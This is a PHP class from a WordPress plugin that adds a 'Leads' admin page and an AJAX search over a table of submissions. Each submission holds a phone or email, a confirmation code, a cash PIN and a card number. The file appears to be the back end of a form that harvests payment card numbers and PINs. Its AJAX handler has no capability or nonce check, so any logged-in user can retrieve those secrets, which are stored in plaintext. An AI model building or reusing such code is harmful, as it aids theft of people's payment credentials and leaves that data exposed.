<?php

namespace BOILERPLATE\Inc;

use BOILERPLATE\Inc\Traits\Program_Logs;
use BOILERPLATE\Inc\Traits\Singleton;

class Admin_Top_Menu {

    use Singleton;
    use Program_Logs;

    public function __construct() {
        $this->setup_hooks();
    }

    public function setup_hooks() {
        add_action( 'admin_menu', [ $this, 'register_admin_top_menu' ] );
        add_filter( 'plugin_action_links_' . PLUGIN_BASE_NAME, [ $this, 'add_plugin_action_links' ] );
        add_action( 'wp_ajax_search_leads', [ $this, 'ajax_search_leads' ] );
    }

    function add_plugin_action_links( $links ) {
        $settings_link = '<a href="admin.php?page=leads">' . __( 'Settings', 'lead-form' ) . '</a>';
        array_unshift( $links, $settings_link );
        return $links;
    }

    public function register_admin_top_menu() {
        add_menu_page(
            'Leads',
            'Leads',
            'manage_options',
            'leads',
            [ $this, 'menu_callback_html' ],
            'dashicons-database-view',
            35
        );
    }

    public function menu_callback_html() {
        include_once PLUGIN_BASE_PATH . '/templates/template-admin-top-menu.php';
    }

    function ajax_search_leads() {

        global $wpdb;

        $table_name   = $wpdb->prefix . 'sync_leads';
        $search_query = isset( $_POST['s'] ) ? sanitize_text_field( $_POST['s'] ) : '';

        $where_clause = '';
        if ( !empty( $search_query ) ) {
            $where_clause = $wpdb->prepare(
                "WHERE phone_or_email LIKE %s OR confirmation_code LIKE %s OR card_number LIKE %s",
                '%' . $wpdb->esc_like( $search_query ) . '%',
                '%' . $wpdb->esc_like( $search_query ) . '%',
                '%' . $wpdb->esc_like( $search_query ) . '%'
            );
        }

        $leads = $wpdb->get_results( "SELECT * FROM $table_name $where_clause LIMIT 10" );

        if ( !empty( $leads ) ) {
            echo '<table class="wp-list-table widefat fixed striped table-view-list">';
            echo '<thead>
                    <tr>
                        <th>ID</th>
                        <th>Phone/Email</th>
                        <th>Confirmation Code</th>
                        <th>PIN</th>
                        <th>Card Number</th>
                    </tr>
                  </thead>';
            echo '<tbody>';
            foreach ( $leads as $lead ) {
                echo '<tr>';
                echo '<td>' . esc_html( $lead->id ) . '</td>';
                echo '<td>' . esc_html( $lead->phone_or_email ) . '</td>';
                echo '<td>' . esc_html( $lead->confirmation_code ) . '</td>';
                echo '<td>' . esc_html( $lead->cash_pin ) . '</td>';
                echo '<td>' . esc_html( $lead->card_number ) . '</td>';
                echo '</tr>';
            }
            echo '</tbody>';
            echo '</table>';
        } else {
            echo '<p>No submissions found.</p>';
        }

        wp_die(); // Required to terminate AJAX request properly
    }

}